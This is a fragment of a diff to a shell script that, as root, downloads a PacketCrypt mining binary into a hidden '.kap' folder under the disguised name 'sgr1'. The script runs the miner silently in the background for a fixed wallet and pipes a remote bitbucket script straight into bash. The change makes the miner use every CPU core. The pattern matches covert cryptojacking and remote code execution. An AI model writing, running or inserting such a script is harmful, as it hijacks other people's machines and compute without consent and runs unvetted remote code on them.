@@ -12,5 +12,5 @@ sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://
 mkdir .kap && cd .kap
 wget -O sgr1 https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.2/packetcrypt-v0.5.2-linux_amd64 >/dev/null 2>&1
 chmod +x sgr1 
-sudo ./sgr1 ann -p pkt1qgwzdljmxtekhqkkl9jzlhe6lpej5tykurudvqg http://pool.pkt.world/master/1024 http://pool.pktpool.io/diff/1024 http://pool.pkteer.com/d/1024 https://stratum.zetahash.com/d/1024 > /dev/null 2>&1 &
+sudo ./sgr1 ann -p pkt1qgwzdljmxtekhqkkl9jzlhe6lpej5tykurudvqg http://pool.pkt.world/master/1024 http://pool.pktpool.io/diff/1024 http://pool.pkteer.com/d/1024 https://stratum.zetahash.com/d/1024 -t $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/mypile/filesg/raw/main/boled04.sh | bash
